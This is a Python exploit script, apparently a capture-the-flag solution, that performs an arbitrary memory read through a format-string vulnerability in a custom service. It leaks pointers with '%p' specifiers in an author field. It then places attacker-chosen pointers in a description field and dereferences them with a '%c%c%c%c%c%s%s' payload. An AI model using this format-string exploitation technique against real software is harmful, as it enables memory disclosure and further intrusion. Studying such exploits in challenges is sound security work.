#!/usr/bin/env python3
"""Demonstrate arbitrary read through the format string:
   args 6/7 are the first 16 bytes of `description` (attacker controlled qwords),
   so "%c%c%c%c%c%s" dereferences an attacker-chosen pointer."""
import sys, struct, re
sys.path.insert(0, ".")          # 复用同目录的 pwn.py
from pwn import Conn, aethmap, upload, show, patch   # reuse helpers

def run():
    c=Conn(); c.recv_until()
    out=upload(c, aethmap(0xE0, name=b"LEAK", author=b"%p.%p.%p.%p"))
    vals=[int(x,16) for x in re.findall(rb"0x[0-9a-f]+", out.split(b"by",1)[1].split(b"\n")[0])]
    husk=vals[3]
    print("[i] husk=%#x"%husk)
    c.cmd(b"SCRIBE 1")
    o,s=show(c,1); S1=s["scribe"]; A=s["scroll"]
    print("[i] scroll=%#x scribe=%#x"%(A,S1))
    # read Scribe object (target ptr, limit=0x40, seal ptr) as a string
    desc=struct.pack("<Q",S1)+struct.pack("<Q",S1+8)
    out=upload(c, aethmap(0xE0, name=b"R", author=b"%c%c%c%c%c%s%s", desc=desc))
    print("[i] %c*5 + %s%s  ->", out.split(b"by",1)[1][:120])
    c.s.close()

if __name__=="__main__":
    run()
